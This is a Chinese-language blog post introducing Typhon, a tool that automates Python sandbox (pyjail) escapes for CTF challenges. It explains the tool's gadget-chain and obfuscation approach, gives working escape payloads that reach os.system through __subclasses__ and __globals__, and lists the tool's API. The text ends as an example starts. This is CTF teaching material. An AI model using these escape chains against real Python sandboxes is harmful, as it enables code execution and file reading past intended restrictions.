@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="随着CTF题目的发展，越来越多的自动化解题工具诞生，使CTFer能够避开繁琐而固定的解题流程，并将精力花在真正能学到东西，有意义的环节上。 pyjail（python jail）作为一种经典的CTF题目类型，在近几年的大赛中频繁出现。然而，对于经典的WAF bypass至RCE或读文件的题目，随着时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Typhon: 一种pyjail自动化绕过的思路及其粗略实现">
+<meta property="og:url" content="https://lamentxu.top/posts/2025-09-20-typhon-pyjail/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="随着CTF题目的发展，越来越多的自动化解题工具诞生，使CTFer能够避开繁琐而固定的解题流程，并将精力花在真正能学到东西，有意义的环节上。 pyjail（python jail）作为一种经典的CTF题目类型，在近几年的大赛中频繁出现。然而，对于经典的WAF bypass至RCE或读文件的题目，随着时">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19101758/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19101758/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19101758/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19101758/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19101758/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19101758/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19101758/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19101758/08.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19101758/09.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19101758/10.png">
+<meta property="article:published_time" content="2025-09-20T13:52:00.000Z">
+<meta property="article:modified_time" content="2025-09-20T13:52:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/19101758/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>Typhon: 一种pyjail自动化绕过的思路及其粗略实现</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2025-10-21-2025-web-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2025-08-25-nssctf-4th-web-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&text=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&title=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&is_video=false&description=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Typhon: 一种pyjail自动化绕过的思路及其粗略实现&body=Check out this article: https://lamentxu.top/posts/2025-09-20-typhon-pyjail/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&title=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&title=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&title=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&title=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&name=Typhon: 一种pyjail自动化绕过的思路及其粗略实现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-09-20-typhon-pyjail/&t=Typhon: 一种pyjail自动化绕过的思路及其粗略实现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ideas"><span class="toc-number">1.</span> <span class="toc-text">Ideas</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Definitions"><span class="toc-number">1.1.</span> <span class="toc-text">Definitions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Paths%EF%BC%9A%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text">Paths：命名空间限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Workflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">Workflow</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#techniques%EF%BC%9A%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text">techniques：字符限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#To-conclude%E2%80%A6"><span class="toc-number">1.4.</span> <span class="toc-text">To conclude…</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Typhon-a-simple-imeplemention"><span class="toc-number">2.</span> <span class="toc-text">Typhon: a simple imeplemention</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#For-example"><span class="toc-number">2.1.</span> <span class="toc-text">For example</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q-A"><span class="toc-number">2.2.</span> <span class="toc-text">Q&amp;A</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Limitations"><span class="toc-number">2.3.</span> <span class="toc-text">Limitations</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#To-sum-up"><span class="toc-number">3.</span> <span class="toc-text">To sum up</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Typhon: 一种pyjail自动化绕过的思路及其粗略实现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-20T13:52:00.000Z" class="dt-published" itemprop="datePublished">2025-09-20</time>
+        
+        (Updated: <time datetime="2025-09-20T13:52:00.000Z" class="dt-updated" itemprop="dateModified">2025-09-20</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>随着CTF题目的发展，越来越多的自动化解题工具诞生，使CTFer能够避开繁琐而固定的解题流程，并将精力花在真正能学到东西，有意义的环节上。</p>
+<p>pyjail（python jail）作为一种经典的CTF题目类型，在近几年的大赛中频繁出现。然而，对于经典的WAF bypass至RCE或读文件的题目，随着时间推进，其套路已经被开发得相当成熟。每一种自动化解题工具的诞生，都是基于一定成熟的套路完成。因此，我想提出一种尝试自动化解决pyjail题目的思路。这个思路最终被实现为Typhon，一个粗疏简略但能用的一把梭工具。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install TyphonBreaker</span><br></pre></td></tr></table></figure>
+
+<h1 id="Ideas"><a href="#Ideas" class="headerlink" title="Ideas"></a>Ideas</h1><h2 id="Definitions"><a href="#Definitions" class="headerlink" title="Definitions"></a>Definitions</h2><p>首先，我们的目标题型有且只有一种：<strong>通过绕过出题人给予的特定WAF策略，最终在受限制的沙箱环境中实现任意RCE或者读取文件的目标，以获取flag。</strong></p>
+<p>根据此，我们首先定义两个此种题型的常见目标：</p>
+<ul>
+<li>RCE</li>
+<li>读取文件</li>
+</ul>
+<p>同时，面对我们定义沙箱中实际执行代码的函数为<strong>sink</strong>，通常情况下，sink点一般为<code>exec()</code>或<code>eval()</code></p>
+<p>我们认为：</p>
+<ul>
+<li>对于RCE，只要代码得到执行，就算是RCE成功。我们无需关心回显问题。因此，我们不在乎<code>exec</code>和<code>eval</code>的区别。</li>
+<li>对于文件读取，我们需要将能够读取到的文件内容返回。因此，我们关心回显问题。由此，涉及到报错回显（是否允许<code>stderr</code>回显）以及正常回显（是否有类似于print()语句的函数返回sink点的返回值）两种回显方式。不论是哪种sink点，只要开放了报错回显，我们就可以通过<code>stderr</code>泄露文件信息。而针对正常的回显，<code>exec</code>和<code>eval</code>在处理方式上小有差别，此处略。</li>
+</ul>
+<p>我们将WAF定义为三种类别：</p>
+<ul>
+<li>字符限制。如常见的黑白名单，正则表达式，长度限制</li>
+<li>运行时限制。如audithook（尚不支持）</li>
+<li>命名空间限制。这个限制出现在sink点的后两个参数中（e.g. <code>exec(cmd, {&#39;__builtlins__&#39;: None})</code>就将<code>__builtins__</code>全部删除）</li>
+</ul>
+<p>note：针对sink点的后两个参数有如下解释：</p>
+<p><img src="/images/migrated/19101758/01.png" alt="image"></p>
+<p>为了简化问题，我们将<code>locals</code>与<code>globals</code>的叠加统称为<code>local_scope</code>，即沙箱运行时的本地命名空间。若二者叠加时存在矛盾，请参考上图说明。</p>
+<p>我们定义两种bypass方式：</p>
+<ul>
+<li><code>path</code>: 通过不同的载荷进行绕过（例如os.system(‘calc’)和subprocess.Popen(‘calc’)）</li>
+<li><code>technique</code>: 使用不同技术对相同的有效载荷进行处理从而绕过（例如，os.system(‘c’+’a’+’l’+’c’) 和 os.system(‘clac’[::-1]))</li>
+</ul>
+<p>其中，关于<code>path</code>绕过只与命名空间限制有关。关于<code>technique</code>绕过只于字符限制有关。</p>
+<h2 id="Paths：命名空间限制"><a href="#Paths：命名空间限制" class="headerlink" title="Paths：命名空间限制"></a>Paths：命名空间限制</h2><p>让我们先来聊聊：如何自动化绕过命名空间限制</p>
+<p>为什么我说：pyjail某些题已经可以使用自动化工具写了呢？是因为其已经高度流程化了。举个例子：</p>
+<p>现在假设，有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(input(&#x27;&gt;&gt; &#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>这个payload我相信大家闭着眼睛能写出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;calc&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>我们可以把它拆解成：</p>
+<ul>
+<li>从<code>__builtins__</code>中获取函数<code>__import__</code></li>
+<li>导入<code>os</code>包，并使用<code>os</code>包中的<code>system</code>函数RCE</li>
+</ul>
+<p>我们来给它上个限制——本地空间中没有<code>__import__</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(input(&#x27;&gt;&gt; &#x27;),&#123;&#x27;__import__&#x27;:None&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>那么，我们就需要获取<code>__builtins__</code>，而后从<code>__builtins__</code>中获取<code>__import__</code></p>
+<p>如何获取<code>__builtins__</code>？简单。我们还有别的函数，可以使用<code>__self__</code>魔术方法拿到<code>__builtins__</code>集合：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id.__self__</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/19101758/02.png" alt="image"></p>
+<p>这样，我们就获取到了<code>__builtins__</code>。后续内容与上相同，我们写出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id.__self__.__import__(&#x27;os&#x27;).system(&#x27;calc&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/19101758/03.png" alt="image"></p>
+<p>继续上难度。我们假设在当前命名空间下没有<code>__builtins__</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(input(&#x27;&gt;&gt; &#x27;),&#123;&#x27;__builtins__&#x27;:None&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>那么，所有的内置函数和类会被删除。我们剩下的只有内置的对象，如<code>1</code>,<code>()</code>,<code>{}</code>。</p>
+<p>在python中，假如<code>__main__</code>，即当前命名空间下的<code>__builtins__</code>被删除，我们可以想办法找到属于其他命名空间的类中的函数，再运行<code>__globals__</code>寻找这个命名空间下的<code>__builtins__</code></p>
+<p>我们使用<code>{}</code>对象为例子：</p>
+<p>我们通过一个python object的<code>__class__</code>魔术属性可以返回其对应的类。因此，通过<code>{}.__class__</code>我们就获取了<code>&lt;class &#39;dict&#39;&gt;</code>。接下来，我们通过一个python class的<code>__subclasses__()</code>魔术方法可以获取所有继承自此的类：</p>
+<p><img src="/images/migrated/19101758/04.png" alt="image"></p>
+<p>由此，我们获得四个位于其他命名空间的类。</p>
+<p>我们取第二个类为例子。</p>
+<p><img src="/images/migrated/19101758/05.png" alt="image"></p>
+<p>dir一下看看：</p>
+<p><img src="/images/migrated/19101758/06.png" alt="image"></p>
+<p>取copy为例子：</p>
+<p><img src="/images/migrated/19101758/07.png" alt="image"></p>
+<p>成功获取<code>__builtins__</code>。后文与上述相同即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__subclasses__()[2].copy.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;calc&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>到这里，你可能意识到一点：<code>后文与上述相同</code>出现过很多次。没错，目前而言，我们的终点在于<code>os.system()</code>，为了获取它，我们可以利用<code>__import__</code>来动态导入，为了获取它，我们需要寻找<code>__builtins__</code>，为了获取它……</p>
+<p>显然，RCE的方法不只一种，它也可以是<code>subprocess.run</code>或者<code>uuid._get_command_stdout</code>。显然，导入包的方式不只<code>__import__</code>，它也可以是<code>__loader__.load_module</code>或者<code>sys.modules</code>。显然，获取<code>__builtins__</code>的方式不只一种……</p>
+<p><strong>我们可以，通过尽可能收集所有的有用的东西，最后把他们拼在一起。形成一套完整的payload。</strong> 是的，这就是我们自动化的思路：<strong>gadgets chain</strong>。</p>
+<p>再举个例子，如假设存在下列黑名单：</p>
+<ul>
+<li>本地命名空间无<code>__builtins__</code>，只允许使用字符串作为起始点（我们在上例中是以字典object为起始点的）</li>
+</ul>
+<p>我们这样处理：</p>
+<ul>
+<li>首先，我们通过<code>&#39;J&#39;.__class__.__class__</code>获取<code>type</code>（类构建器）</li>
+<li>随后，我们找到获取<code>type</code>后可能可以获取<code>__builtins__</code>的RCE链子<code>TYPE.__subclasses__(TYPE)[0].register.__globals__[&#39;__builtins__&#39;]</code></li>
+<li>随后，我们找到获取<code>__builtins__</code>后的RCE链子<code>BUILTINS_SET[&#39;breakpoint&#39;]()</code></li>
+<li>最后，我们将代表builtins字典的占位符<code>BUILTINS_SET</code>替换为上步中获取的<code>__builtins__</code>路径，以此类推，将<code>TYPE</code>占位符替换为真实的路径，就得到了最终的payload。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;J&#x27;.__class__.__class__.__subclasses__(&#x27;J&#x27;.__class__.__class__)[0].register.__globals__[&#x27;__builtins__&#x27;][&#x27;breakpoint&#x27;]()</span><br></pre></td></tr></table></figure>
+
+<p>到这里，我们就可以移出我们的自动化思路：<strong>我们内置上百种<code>gadgets</code>，并一步一步爆破，尽可能寻找能找到的，随后再将它们拼在一起。</strong></p>
+<h3 id="Workflow"><a href="#Workflow" class="headerlink" title="Workflow"></a>Workflow</h3><p>让我来简单地实现一下。我们定义三个函数，使用<code>bypassMAIN</code>作为主函数。负责<strong>收集尽可能能收集的</strong>，随后我们定义两个终点函数<code>bypassRCE</code>（负责RCE）和<code>bypassREAD</code>(负责读文件)，负责把上流函数收集到的东西依据需求拼起来，形成最终的payload：</p>
+<ul>
+<li>每一个终点函数（<code>bypassRCE</code>, <code>bypassREAD</code>）都会调用主函数<code>bypassMAIN</code>，主函数会尽可能搜集所有的可用gadgets（如上例中的<code>type</code>）并将收集到的内容传递给对应的下级函数。</li>
+<li><code>bypassMAIN</code>函数在简单分析完当前的变量空间后，会：<ul>
+<li>尝试直接RCE（如<code>help()</code>, <code>breakporint()</code>）</li>
+<li>尝试获取生成器</li>
+<li>尝试获取type</li>
+<li>尝试获取object</li>
+<li>如当前空间中的<code>__builtins__</code>未被删除，但被修改，尝试恢复（如<code>id.__self__</code>）</li>
+<li>如当前空间中的<code>__builtins__</code>被删除，尝试从其他命名空间恢复</li>
+<li>承上，尝试继承链绕过</li>
+<li>尝试获取import包的能力</li>
+<li>尝试直接通过可能恢复的<code>__builtins__</code> RCE</li>
+<li>将结果传递给下级函数</li>
+</ul>
+</li>
+<li>下级函数拿到<code>bypassMAIN</code>的结果后，会根据该函数所实现的需求，选择对应的gadgets进行处理（如<code>bypassRCE</code>专注于RCE，<code>bypassREAD</code>专注于文件读取）。其过程与上述相似。</li>
+</ul>
+<p>至此，我们完成了对于本地命名空间的限制的自动化绕过。</p>
+<h2 id="techniques：字符限制"><a href="#techniques：字符限制" class="headerlink" title="techniques：字符限制"></a>techniques：字符限制</h2><p>我们知道，黑白名单，正则表达式，长度限制……我已经厌倦了。</p>
+<p>所以我编写了一个以递归为基础算法的bypasser。思路是这样的：</p>
+<ul>
+<li>我们定义数十种bypasser。举个例子：一个负责将所有的字符反过来（<code>&#39;__builtins__&#39;</code> -&gt; <code>&#39;__snitliub__&#39;[::-1]</code>）。一个负责将所有的字符串编码为hex（<code>&#39;__builtins__&#39;</code> -&gt; <code>&#39;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#39;</code>）</li>
+<li>当处理<code>&#39;__builtins__&#39;</code>这个payload时，我们先运行第一个bypasser，再运行第二个bypasser，再把二者结合起来运行。我们会得到四个东西：<ul>
+<li><code>&#39;__builtins__&#39;</code></li>
+<li><code>&#39;__snitliub__&#39;[::-1]</code></li>
+<li><code>&#39;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#39;</code></li>
+<li><code>&#39;\x5f\x5f\x73\x6e\x69\x74\x6c\x69\x75\x62\x5f\x5f&#39;[::-1]</code></li>
+</ul>
+</li>
+</ul>
+<p>他们在python中表示一个意思。都是<code>&#39;__builtins__&#39;</code></p>
+<p>我们有许多类似的bypasser。有些bypasser需要本地命名空间中含有某些元素时才可以触发，如将字符化为<code>chr()</code> （<code>&#39;A&#39; -&gt; chr(41)</code>）这个bypasser只有当前空间中有，或我们可以通过绕过方式获取时，我们才会使用。</p>
+<h2 id="To-conclude…"><a href="#To-conclude…" class="headerlink" title="To conclude…"></a>To conclude…</h2><p>也就是说，我们通过命名空间选择合适的gadgets，再丢入bypasser中进行绕过，如果其满足所有的黑名单条件，我们就将这个gadgets放进命名空间。并继续寻找下一个可以寻找的东西，此时，不论是<code>path</code>还是<code>technique</code>环节，都会受到上一步的影响。（如：上一步成功找到了<code>base64</code>，下一步中的bypasser就会出现<code>base64</code>编码绕过）</p>
+<h1 id="Typhon-a-simple-imeplemention"><a href="#Typhon-a-simple-imeplemention" class="headerlink" title="Typhon: a simple imeplemention"></a>Typhon: a simple imeplemention</h1><p>肯定有人说，<code>talk is cheap, show me the code</code>，Well，这就是<code>Typhon</code>：<a target="_blank" rel="noopener" href="https://github.com/Team-intN18-SoybeanSeclab/Typhon">https://github.com/Team-intN18-SoybeanSeclab/Typhon</a></p>
+<p>截至这篇文章完成，它已经有了超过2k的下载量。</p>
+<p><code>Typhon</code>是一个对上述思路的简略实现。你可以使用pip安装：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install TyphonBreaker</span><br></pre></td></tr></table></figure>
+
+<p>封装了两个函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import Typhon</span><br><span class="line">Typhon.bypassRCE(cmd: str,</span><br><span class="line">    local_scope:dict=None,</span><br><span class="line">    banned_chr:list=[],</span><br><span class="line">    allowed_chr:list=[],</span><br><span class="line">    banned_ast:list=[],</span><br><span class="line">    banned_re:list=[],</span><br><span class="line">    max_length:int=None,</span><br><span class="line">    allow_unicode_bypass:bool=False,</span><br><span class="line">    print_all_payload:bool=False,</span><br><span class="line">    interactive:bool=True,</span><br><span class="line">    depth:int=5,</span><br><span class="line">    recursion_limit:int=200,</span><br><span class="line">    log_level:str=&#x27;INFO&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><code>cmd</code>: RCE所使用的bash command<br><code>local_scope</code>: 沙箱内的全局变量空间，若无限制则忽略此参数<br><code>banned_chr</code>: 禁止的字符<br><code>allowed_chr</code>: 允许的字符（<code>[]</code>为全部允许）<br><code>banned_ast</code>: 禁止的AST节点<br><code>banned_re</code>: 禁止的正则表达式（列表或字符串）<br><code>max_length</code>: payload的最大长度<br><code>allow_unicode_bypass</code>: 是否允许unicode绕过<br><code>print_all_payload</code>: 是否打印所有payload<br><code>interactive</code>: 当前pyjail是否允许<code>stdin</code>（即如<code>breakpoint()</code>等payload是否成立）<br><code>depth</code>: 组合bypasser的最大深度（建议使用默认值）<br><code>recursion_limit</code>: 最大递归深度（建议使用默认值）<br><code>log_level</code>: 输出级别（只有<code>info</code>和<code>debug</code>有意义，不建议更改）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import Typhon</span><br><span class="line">Typhon.bypassREAD(filepath: str,</span><br><span class="line">    mode:str=&#x27;eval&#x27;,</span><br><span class="line">    local_scope:dict=None,</span><br><span class="line">    banned_chr:list=[],</span><br><span class="line">    allowed_chr:list=[],</span><br><span class="line">    banned_ast:list=[],</span><br><span class="line">    banned_re:list=[],</span><br><span class="line">    max_length:int=None,</span><br><span class="line">    allow_unicode_bypass:bool=False,</span><br><span class="line">    print_all_payload:bool=False,</span><br><span class="line">    interactive:bool=True,</span><br><span class="line">    depth:int=5,</span><br><span class="line">    recursion_limit:int=200,</span><br><span class="line">    log_level:str=&#x27;INFO&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><code>filepath</code>: 所读取的文件路径<br><code>mode</code>: 沙箱内RCE的模式，可选<code>eval</code>或<code>exec</code>，关系到最后外带输出的逻辑<br><code>local_scope</code>: 沙箱内的全局变量空间，若无限制则忽略此参数<br><code>banned_chr</code>: 禁止的字符<br><code>allowed_chr</code>: 允许的字符（<code>[]</code>为全部允许）<br><code>banned_ast</code>: 禁止的AST节点<br><code>banned_re</code>: 禁止的正则表达式（列表或字符串）<br><code>max_length</code>: payload的最大长度<br><code>allow_unicode_bypass</code>: 是否允许unicode绕过<br><code>print_all_payload</code>: 是否打印所有payload<br><code>interactive</code>: 当前pyjail是否允许<code>stdin</code>（即如<code>breakpoint()</code>等payload是否成立）<br><code>depth</code>: 组合bypasser的最大深度（建议使用默认值）<br><code>recursion_limit</code>: 最大递归深度（建议使用默认值）<br><code>log_level</code>: 输出级别（只有<code>info</code>和<code>debug</code>有意义，不建议更改）</p>
+<p><strong>此处再注：此工具目前对<code>bypassREAD</code>函数的处理很不严谨（当前版本甚至没有考虑如何外带输出）。该函数将在后面的版本中得到大幅度的改善和细化。（毕竟本工具截至目前都是我个人在完成，有很多考虑不周和不严谨之处，请原谅）</strong></p>
+<h2 id="For-example"><a href="#For-example" class="headerlink" title="For example"></a>For example</h2><p>来个例题试试：</p>
